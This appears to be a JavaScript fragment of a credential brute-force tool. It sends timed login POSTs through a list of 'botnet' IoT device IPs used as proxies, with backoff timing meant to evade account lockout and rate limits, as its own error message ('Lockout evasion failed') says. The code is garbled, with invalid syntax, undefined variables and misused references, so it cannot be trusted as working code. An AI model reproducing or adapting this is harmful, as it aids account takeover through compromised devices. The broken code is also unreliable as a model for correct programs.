module.exports.defaultOptions(){
return{
botnetIoTDeviceList:['192.168.0.x','10.x.x.x'],
exponentialBackoffInitialDelayMs:this.botnetIoTDeviceList.length*1000,
maxLoginAttemptsPerIp:this.botnetIoTDeviceList.length*10,
rateLimitResetIntervalMs:this.maxLoginAttemptsPerIp*1000,
}
};

module.exports.simulateLockouts(){

try{
for(const ip in this.options.botnetIoTDeviceList){

setTimeout(()=>
fetch(`/login/ajax/`,
{
method:`POST`,
proxy:`http://${ip}`,
headers:{'X-CSRFToken':token},
body:`{"username":${user},"password":${pass}}`
}),this.backoffDelayMs+=this.backoffMultiplier)

}catch(err){
throw new Error(`Lockout evasion failed after attempt #${currentAttempt}/${maxAttempts}:${error}`);
}

}
